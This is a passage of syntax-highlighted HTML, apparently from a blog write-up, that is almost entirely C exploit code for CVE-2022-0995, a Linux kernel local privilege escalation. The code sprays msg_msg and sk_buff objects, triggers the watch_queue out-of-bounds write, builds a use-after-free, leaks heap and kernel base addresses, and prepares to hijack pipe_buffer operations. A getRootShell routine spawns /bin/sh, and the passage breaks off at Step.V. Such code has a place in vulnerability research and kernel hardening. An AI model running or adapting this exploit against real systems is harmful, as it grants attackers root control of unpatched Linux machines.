*/</span></span><br><span class="line"><span class="type">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    page;</span><br><span class="line">    <span class="type">uint32_t</span>    offset, len;</span><br><span class="line">    <span class="type">uint64_t</span>    ops;</span><br><span class="line">    <span class="type">uint32_t</span>    flags;</span><br><span class="line">    <span class="type">uint32_t</span>    padding;</span><br><span class="line">    <span class="type">uint64_t</span>    private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    confirm;</span><br><span class="line">    <span class="type">uint64_t</span>    release;</span><br><span class="line">    <span class="type">uint64_t</span>    try_steal;</span><br><span class="line">    <span class="type">uint64_t</span>    get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="type">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next,</span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> m_list_prev, <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, </span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span></span><br><span class="line">&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spraySkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span></span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">freeSkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigerOutOfBoundWrite</span><span class="params">(<span class="type">int</span> pipe_fd[<span class="number">2</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> *<span class="title">wfilter</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nfilters;</span><br><span class="line">    </span><br><span class="line">    nfilters = <span class="number">4</span>;</span><br><span class="line">    wfilter = (<span class="keyword">struct</span> watch_notification_filter*)</span><br><span class="line">            <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> watch_notification_filter)</span><br><span class="line">                + nfilters * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> watch_notification_type_filter));</span><br><span class="line">    wfilter-&gt;nr_filters = nfilters;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// normal filter</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (nfilters - <span class="number">1</span>); i++)</span><br><span class="line">        wfilter-&gt;filters[i].type = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// evil filter</span></span><br><span class="line">    <span class="comment">// 0x300 = 64 * 12, 12 * 8 = 96bytes</span></span><br><span class="line">    <span class="comment">// 1 &lt;&lt; 0xa = 1024, maybe we can hit a proper bit</span></span><br><span class="line">    wfilter-&gt;filters[nfilters - <span class="number">1</span>].type = <span class="number">0x30a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// triger oob write</span></span><br><span class="line">    <span class="keyword">if</span> (ioctl(pipe_fd[<span class="number">0</span>], IOC_WATCH_QUEUE_SET_FILTER, wfilter) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to ioctl IOC_WATCH_QUEUE_SET_FILTER!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// prevent memory leak in userspace(no need in fact)</span></span><br><span class="line">    <span class="built_in">free</span>(wfilter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">        errExit(<span class="string">&quot;failed to gain the root!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>         oob_pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="type">int</span>         victim_qid, real_qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    victim_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_base;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_offset;</span><br><span class="line">    <span class="type">uint64_t</span>    *rop_chain;</span><br><span class="line">    <span class="type">int</span>         rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.O</span></span><br><span class="line"><span class="comment">     * Initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] CVE-2022-0995 Linux Privilege Escalation.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// run the exp on specific core only</span></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pipe to trigert off-by-null</span></span><br><span class="line">    <span class="keyword">if</span> (pipe2(oob_pipe_fd, O_NOTIFICATION_PIPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to create O_NOTIFICATION_PIPE!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// socket pairs to spray sk_buff</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.I</span></span><br><span class="line"><span class="comment">     * build msg_queue, spray primary and secondary msg_msg,</span></span><br><span class="line"><span class="comment">     * and use OOB write to construct the overlapping</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Build message queue...&quot;</span>);</span><br><span class="line">    <span class="comment">// build 4096 message queue</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray primary and secondary message</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create hole in primary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive primary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// triger off-by-null on primary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);</span><br><span class="line">    trigerOutOfBoundWrite(oob_pipe_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the queues that have the same secondary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);</span><br><span class="line">    victim_qid = real_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((i % <span class="number">1024</span>) == <span class="number">0</span>)  <span class="comment">// the hole</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] error qid: %d\n&quot;</span>, i);</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">0</span>] != MSG_TAG)</span><br><span class="line">            errExit(<span class="string">&quot;failed to make corruption!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">4</span>] != i)</span><br><span class="line">        &#123;</span><br><span class="line">            victim_qid = i;</span><br><span class="line">            real_qid = *(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make overlapping!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, </span><br><span class="line">            victim_qid, real_qid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.II</span></span><br><span class="line"><span class="comment">     * construct UAF</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the victim secondary msg_msg, then we get a UAF</span></span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.III</span></span><br><span class="line"><span class="comment">     * spray sk_buff to leak msg_msg addr</span></span><br><span class="line"><span class="comment">     * construct fake msg_msg to leak addr of UAF obj</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// use fake msg_msg to read OOB</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] OOB read from victim msg_msg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release and re-spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="comment">// so that we can make an arbitrary read on a primary msg_msg</span></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), </span><br><span class="line">            nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cal the addr of UAF obj by the header we just read out</span></span><br><span class="line">    nearby_msg_prim = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.IV</span></span><br><span class="line"><span class="comment">     * fix the header of UAF obj and release it</span></span><br><span class="line"><span class="comment">     * spray pipe_buffer and leak the kernel base</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// re-construct the msg_msg to fix it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            victim_addr + <span class="number">0x800</span>, victim_addr + <span class="number">0x800</span>, <span class="comment">// a valid kheap addr is valid</span></span><br><span class="line">            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), </span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// release UAF obj as secondary msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release UAF obj in message queue...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// spray pipe_buffer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release the sk_buff to read pipe_buffer, leak kernel base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                    <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, </span><br><span class="line">                        pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            kernel_base, kernel_offset);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.V</span></span><br><span class="line"><span class="comment">     * hijack the ops of pipe_buffer</span></span><br><span class="line"><span class="comment">     * free all pipe to trigger fake ptr</span></span><br><span 